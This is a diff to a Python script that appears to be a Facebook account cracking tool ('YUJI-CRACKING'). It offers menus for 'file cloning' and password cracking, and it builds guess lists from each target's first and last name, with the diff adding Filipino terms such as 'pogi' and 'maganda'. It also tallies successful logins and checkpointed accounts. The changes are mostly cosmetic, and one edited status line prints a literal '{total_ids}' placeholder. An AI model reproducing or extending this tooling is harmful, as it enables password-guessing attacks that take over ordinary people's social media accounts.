@@ -10,8 +10,6 @@ try:
     from bs4 import BeautifulSoup
     from rich.panel import Panel as nel
     from rich import print as cetak
-    from rich import print
-    from rich.panel import Panel as pn
 except ModuleNotFoundError: 
     print('\n Installing missing modules ...')
     os.system('pip install requests bs4 futures==2 > /dev/null')
@@ -241,7 +239,7 @@ def YUJI():
     try:
                 x = ("***")
                 if x == ("***"):
-                        print(pn)(' [01] FILE CLONING ')
+                        print('[1] FILE CLONING ')
                         print('[0] EXIT ')
                         linex()
                         xd=input(' CHOOSE AN OPTION: ')
@@ -272,10 +270,10 @@ def YUJI():
                                 print('[1] WORKING PASSWORD FOR CLONING ')
                                 print('[2] CRACK WITH CHOICE PASSWORD ')
                                 linex()
-                                ppp=input('[+] CHOOSE: ')
+                                ppp=input('[+] CHOOSE AN OPTION: ')
                                 if ppp in ['1','01']:
-                                        plist.append('first')
-                                        plist.append('last')
+                                        plist.append('lastpogi')
+                                        plist.append('lastmaganda')
                                         plist.append('first123')
                                         plist.append('first1234')
                                         plist.append('first12345')
@@ -288,8 +286,8 @@ def YUJI():
                                         plist.append('lastfirst')
                                         plist.append('first last')
                                         plist.append('last first')
-                                        plist.append('lastlast')
-                                        plist.append('firstfirst')
+                                        plist.append('firstpogi')
+                                        plist.append('firstmaganda')
                                 else:
                                         try:
                                                 linex()
@@ -368,7 +366,7 @@ def followers(ids2):
 def ffb(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [YUJI-CRACKING M1]  %s | OK: %s | CP: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [YUJI-CRACKING M1]  %s | {total_ids} | OK: %s - CP: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
